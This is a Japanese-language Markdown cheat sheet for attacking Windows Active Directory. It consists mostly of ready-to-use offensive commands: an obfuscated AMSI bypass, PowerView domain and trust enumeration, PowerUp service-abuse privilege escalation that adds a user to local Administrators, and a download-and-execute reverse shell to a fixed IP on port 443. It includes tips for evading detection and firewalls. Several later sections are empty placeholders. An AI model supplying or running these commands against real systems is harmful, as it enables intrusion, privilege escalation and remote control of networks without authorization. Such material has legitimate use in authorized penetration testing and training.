# PentestWindowsAD-Cheatsheets

## Essential
### PowerShellの起動
.ps1などの読み込みのため実行ポリシーを指定して起動する
```
> powershell -ep bypass
```
### AMSIバイパス
ペンテストで利用するようなps1は悪性判定されるためAMSIをバイパスする
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

## DomainEnumeration
### PowerView.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
#### DomainUser
```
Get-NetUser | select -ExpandProperty samaccountname
```
#### DomainComputer
```
Get-NetComputer | select -ExpandProperty dnshostname
```
#### Domain Admins
ドメイングループの詳細
```
Get-Netgroup -Name "Domain Admins"
```
ドメイン（アドミン）グループメンバーの列挙
```
Get-NetGroupMember -Name "Domain Admins"
```
#### Enterprise Admins
ルートドメイン内
```
Get-NetGroupMember -Name "Enterprise Admins"
```
子ドメイン内
```
Get-NetGroupMember -Name "Enterprise Admins" -Domain parentdomain.local
```
#### Shares
```
Find-DomainShare
```
旧バージョンのPowerViewでは、特徴的でないものを除外可能<br>
https://github.com/PowerShellMafia/PowerSploit/blob/v3.0.0/Recon/PowerView.ps1<br>
```
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
```
#### Group Policy Object Group
```
Get-NetGPOGroup -Verbose
```
#### Organizational Unit s
```
Get-NetOU | select distinguishedname
```
#### Group Policy Object s
```
Get-NetGPO | select displayname
```
#### ACL(ユーザグループ)
```
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -verbose
```
#### ACL(ドメインアドミングループ)
```
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -verbose
```
#### 特定ユーザの変更修正権限の列挙
```
Invoke-ACLScanner -ResolveGUIDs |  ?{$_.IdentityReferenceName -match "UserNameORGroupName"}
```
#### ドメインフォレスト関連
ドメインフォレスト列挙
```
Get-NetForestDomain
```
ドメインフォレストの信頼関係の列挙
```
Get-NetDomainTrust | ft
Get-NetForestDomain | Get-NetDomainTrust | ft
Get-NetDomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | ft
```
外部ドメインの信頼関係の列挙
```
Get-NetForestDomain -Forest externaldomain.local
Get-NetDomainTrust -Domain externaldomain.local | ft
```
#### ローカル管理者権限のある端末の列挙
```
Find-LocalAdminAccess -Verbose
```
### BloodHound
hogehoge

## LocalPrivilegeEscalation
### PowerUp.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
#### クオートで囲われてない登録サービス一覧
```
Get-UnquotedService
```
#### サービスの実行ファイルが変更可能な登録サービス一覧
```
Get-ModifiableServiceFile
```
#### 登録されているサービスの設定を変更可能な登録サービス一覧
```
Get-ModifiableService
```
#### サービスを悪用する権限昇格
```
Invoke-ServiceAbuse -Name 'hogeservice' -UserName 'hogedomain\fugauser'
```
hogeserviceが悪用されて、コマンド「net localgorup Administrators hogedomain\fugauser /add」が実行される。
#### 全部チェック
```
Invoke-AllChecks
```
## LateralMovement
### PowerShell Remote
Find-PSRemotingLocalAdminAccess.ps1<br>
https://pastebin.com/szWajhfS<br>
ローカル管理者権限で利用可能なPSRemotingの探索
```
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
リモートセッションの確立
```
Enter-PSSession -ComputerName hostname
```
### Reverse Shell
Invoke-PowerShellTcp.ps1<br>
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
powershell.exe iex (iwr http://172.16.100.132/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.132 -Port 443
```
検知回避のため、関数名を変更する方がよい。<br>
<br>
powercat.ps1<br>
https://github.com/besimorhino/powercat/blob/master/powercat.ps1
```
powercat -l -v -p 443 -t 1000
```
ファイアーウォールなどのため、ポートは443を使うほうが成功する可能性が高い。

## DomainPersistence

## DomainPrivilegeEscalation

## ForestPersistence
